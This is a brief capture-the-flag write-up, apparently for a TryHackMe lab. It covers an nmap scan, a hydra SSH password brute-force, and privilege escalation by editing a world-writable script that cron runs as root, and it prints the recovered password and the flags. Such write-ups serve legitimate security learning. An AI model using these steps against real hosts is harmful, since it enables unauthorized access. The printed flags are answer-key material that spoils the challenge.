# Cronjob Privilege Escalation

```
nmap scan
cracking password
priv escalation using crojob running every few minutes.
```

## Notes

```
export IP=10.10.231.131
```

## Questions

1. What port is ssh running on?

```
nmap host -p 4000-5000

Not shown: 1000 closed ports                                                                             │
PORT     STATE SERVICE                                                                                   │
4567/tcp open  tram

4567
```

2. Crack sam's password and read flag1.txt?

```
hydra -l sam -P <full path to pass> 10.10.231.131 -t 4 ssh -f -s 4567
sam:chocolate
THM{dec4389bc09669650f3479334532aeab}                                                                    │

```

3. Escalate your privileges by taking advantage of a cronjob running every minute. What is flag2?

```
crontab -l wont show much.
cat /etc/crontab shows little
/home/scripts directory is interesting script is being ran every minute (full permission for everyone)
cp /home/ubuntu/flag2.txt /tmp/ && chmod 777 /tmp/flag2.txt

THM{b27d33705f97ba2e1f444ec2da5f5f61}

```
